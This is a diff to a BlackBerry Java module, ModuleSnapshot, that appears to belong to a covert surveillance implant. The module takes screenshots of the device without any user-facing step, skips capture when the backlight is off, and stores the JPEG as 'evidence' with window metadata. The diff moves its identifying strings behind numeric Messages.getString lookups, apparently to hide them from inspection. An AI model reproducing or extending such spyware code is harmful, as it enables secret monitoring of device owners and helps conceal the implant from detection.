@@ -15,6 +15,7 @@ import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Check;
@@ -31,7 +32,7 @@ import blackberry.utils.WChar;
  */
 public final class ModuleSnapshot extends BaseInstantModule {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION); //$NON-NLS-1$
     //#endif
 
     private static Bitmap bitmap;
@@ -58,7 +59,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
     private int height;
 
     public static String getStaticType() {
-        return "snapshot";
+        return Messages.getString("14.1"); //$NON-NLS-1$
     }
 
     /*
@@ -67,18 +68,18 @@ public final class ModuleSnapshot extends BaseInstantModule {
      */
     public boolean parse(ConfModule conf) {
         try {
-            String qualityParam = conf.getString("quality");
-            if ("low".equals(qualityParam)) {
+            String qualityParam = conf.getString(Messages.getString("14.2")); //$NON-NLS-1$
+            if (Messages.getString("14.3").equals(qualityParam)) { //$NON-NLS-1$
                 quality = 50;
-            } else if ("med".equals(qualityParam)) {
+            } else if (Messages.getString("14.4").equals(qualityParam)) { //$NON-NLS-1$
                 quality = 70;
-            } else if ("high".equals(qualityParam)) {
+            } else if (Messages.getString("14.5").equals(qualityParam)) { //$NON-NLS-1$
                 quality = 90;
             }
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -94,7 +95,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
     public void actualStart() {
 
         //#ifdef DEBUG
-        debug.trace("snapshot");
+        debug.trace("snapshot"); //$NON-NLS-1$
         //#endif
 
         if (bitmap == null) {
@@ -105,7 +106,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
 
         if (!Backlight.isEnabled()) {
             //#ifdef DEBUG
-            debug.trace("No backlight, skipping snapshot");
+            debug.trace("No backlight, skipping snapshot"); //$NON-NLS-1$
             //#endif
             return;
         }
@@ -113,7 +114,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
         getScreenshot();
 
         //#ifdef DEBUG
-        debug.info("Taking screenshot");
+        debug.info("Taking screenshot"); //$NON-NLS-1$
         //#endif
 
         EncodedImage encoded;
@@ -127,7 +128,7 @@ public final class ModuleSnapshot extends BaseInstantModule {
         evidence.atomicWriteOnce(getAdditionalData(), plain);
 
         //#ifdef DEBUG
-        debug.trace("finished run");
+        debug.trace("finished run"); //$NON-NLS-1$
         //#endif
 
     }
@@ -138,17 +139,17 @@ public final class ModuleSnapshot extends BaseInstantModule {
     public void getScreenshot() {
 
         //#ifdef DEBUG
-        debug.trace("portrait: " + Display.getOrientation());
-        debug.trace("w: " + width + " h:" + height);
-        debug.trace("horizontal res: " + Display.getHorizontalResolution());
-        debug.trace("Rowwise: " + Display.isRowwise());
+        debug.trace("portrait: " + Display.getOrientation()); //$NON-NLS-1$
+        debug.trace("w: " + width + " h:" + height); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("horizontal res: " + Display.getHorizontalResolution()); //$NON-NLS-1$
+        debug.trace("Rowwise: " + Display.isRowwise()); //$NON-NLS-1$
         //#endif
 
         Display.screenshot(bitmap, 0, 0, width, height);
     }
 
     private byte[] getAdditionalData() {
-        final String window = "Desktop";
+        final String window = "Desktop"; //$NON-NLS-1$
 
         final int wlen = window.length() * 2;
         final int tlen = wlen + 24;
@@ -166,13 +167,13 @@ public final class ModuleSnapshot extends BaseInstantModule {
         databuffer.write(windowsName);
 
         //#ifdef DBC
-        Check.asserts(windowsName.length == wlen, "Wrong windows name");
+        Check.asserts(windowsName.length == wlen, "Wrong windows name"); //$NON-NLS-1$
         Check.ensures(additionalData.length == tlen,
-                "Wrong additional data name");
+                "Wrong additional data name"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("Additional data len: " + additionalData.length);
+        debug.trace("Additional data len: " + additionalData.length); //$NON-NLS-1$
 
         //#endif
 
